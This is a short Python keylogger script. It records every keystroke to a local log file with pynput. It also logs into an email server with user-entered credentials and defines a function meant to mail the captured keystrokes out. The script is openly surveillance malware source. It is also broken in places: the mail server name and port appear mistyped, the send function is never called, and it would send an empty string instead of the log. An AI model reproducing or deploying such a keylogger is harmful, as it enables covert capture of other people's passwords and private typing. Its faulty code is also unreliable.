from pynput.keyboard import Key, Listener
import logging
import getpass  # Library that makes password non-visible and keeps hidden from being logged
import smtplib  # Protocol library for email

#
email = input('Enter email: ')
password = getpass.getpass(prompt='Password: ', stream=None)
# Information required for email connection
server = smtplib.SMTP_SSL('smt.gmail.com', 456)
server.login(email, password)

key_log = ""

logging.basicConfig(filename=(key_log + "key_log.txt"),
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')


# Function for recording keystrokes
def on_press(key):
    logging.info(str(key))
    # Use esc to exit loop
    if key == Key.esc:
        return False


def send_log():
    # Deliver as following (email you want to send to, email you want to send from, and item)
    # want to send and receive to self as a way to test program
    server.sendmail(email, email, key_log)


# function that monitors keypress from pynput
with Listener(on_press=on_press) as listener:
    listener.join()
